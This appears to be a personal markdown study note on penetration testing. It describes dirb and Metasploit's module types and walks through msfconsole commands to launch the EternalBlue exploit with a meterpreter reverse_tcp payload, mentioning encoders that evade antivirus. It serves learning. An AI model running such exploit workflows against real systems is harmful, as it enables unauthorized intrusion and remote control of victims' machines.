# Using Tool
-------------------
<!-- This is for tools usage for attack -->
# Step for penastration testing
1. Discover host or target in a network
    - Tools like:
        - **dirb** `https://www.kali.org/tools/dirb/`: DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the responses.
2. Simulating attack
    - Tools like:
        - **msfconsole**: In msfconsole (part of the Metasploit Framework), a module refers to a self-contained component that performs a specific task. Modules are the building blocks of the framework and can be used to conduct various penetration testing activities, such as scanning, exploitation, and post-exploitation.
            - **Types of Modules in Metasploit**
                1. Exploit Modules
                    - Purpose: These modules are used to exploit vulnerabilities in a target system. Exploit modules contain the code necessary to take advantage of a specific vulnerability in the target software.
                    - Example: exploit/windows/smb/ms17_010_eternalblue (used to exploit the MS17-010 vulnerability in Windows).
                2. Auxiliary Modules
                    - Purpose: These modules perform tasks other than exploitation, such as scanning, sniffing, fuzzing, and information gathering. They help identify potential vulnerabilities or gather useful data about a target.
                    - Example: auxiliary/scanner/portscan/tcp (used for TCP port scanning).
                3. Payload Modules
                    - Purpose: A payload is the code that is executed on the target system after an exploit successfully compromises it. Payloads are typically used to establish a remote connection back to the attacker or to execute malicious code on the target.
                    - Example: windows/meterpreter/reverse_tcp (establishes a reverse connection to the attacker’s machine and provides a Meterpreter shell).
                4. Post Modules
                    - Purpose: These modules are used after successful exploitation to perform post-exploitation tasks, such as privilege escalation, gathering system information, or maintaining persistence on the target system.
                    - Example: post/windows/gather/enum_applications (collects information about installed applications on a compromised Windows machine).
                5. Encoder Modules
                    - Purpose: These are used to encode payloads in various formats, helping evade security mechanisms like antivirus or intrusion detection systems.
                    - Example: x86/shikata_ga_nai (an encoder that can be used to obfuscate payloads).
                6. NOP (No-Operation) Modules
                    - Purpose: These modules are used to generate strings of NOP instructions (No Operation) to ensure that payloads have proper alignment or to evade detection systems.
                    - Example: x86/single_byte (generates NOP instructions for x86 architectures).
            - **<span style="color: green;"><u>Structure of a Module</u></span>**
                - Every module in Metasploit typically consists of:

                    - **Module Name**: Defines the specific task of the module, e.g., exploit/windows/smb/ms17_010_eternalblue.
                    - **Options**: These are settings that need to be configured, such as RHOST (remote host) and LHOST (local host). Each module has a set of required and optional options.
                    - **Actions**: Some modules allow multiple actions, like different types of scanning in auxiliary modules.
            - **Example of a Module Workflow**
                - Consider the exploit module ms17_010_eternalblue. Here’s how you would interact with it:
                    1. <b>Use the Module:</n>
                        ``` use exploit/windows/smb/ms17_010_eternalblue ```
                    2. **Show Options (to see the configurable parameters):**
                        ``` show options ```
                    3. **Set Options (e.g., set the target host and payload):**
                        ``` set RHOST 192.168.1.5 set ```
                        ``` PAYLOAD windows/x64/meterpreter/reverse_tcp ```
                    4. **Run the Module:** ```run```
            - **Module Path Structure**
                - The naming convention of modules follows a specific directory structure that helps users easily identify the type of module. For example:
                    ```exploit/windows/smb/ms17_010_eternalblue```
                - **exploit**: Module type (exploit).
                - **windows**: Target operating system or platform.
                - **smb**: The service or protocol targeted (in this case, SMB).
                - **ms17_010_eternalblue**: The specific vulnerability or exploit.
            - Summary: 
                Modules in msfconsole are the core components that allow you to perform tasks like vulnerability exploitation, information gathering, payload execution, and post-exploitation activities. The modular nature of Metasploit makes it highly flexible and customizable, enabling penetration testers to mix and match different modules to fit their specific needs.


